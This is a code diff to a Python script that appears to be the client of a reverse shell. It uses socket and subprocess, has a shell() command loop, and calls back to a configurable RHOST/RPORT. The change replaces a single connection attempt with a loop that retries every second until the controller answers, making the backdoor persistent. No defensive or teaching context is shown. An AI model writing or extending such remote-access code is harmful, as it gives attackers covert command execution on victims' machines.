@@ -3,6 +3,11 @@
 import socket
 import subprocess
 import json
+import time
+
+# Variables
+RHOST = "127.0.0.1"
+RPORT = 54321
 
 def reliable_send(data):
 	# If data is bytes
@@ -28,9 +33,13 @@ def init_client():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 	# Connect socket
-	s.connect(("127.0.0.1", 54321))
-
-	print("Connection Established to Server")
+	while True:
+		try:
+			s.connect((RHOST, RPORT))
+			print("Connection Established to Server")
+			return
+		except ConnectionRefusedError:
+			time.sleep(1)
 
 def shell():
 	while True:
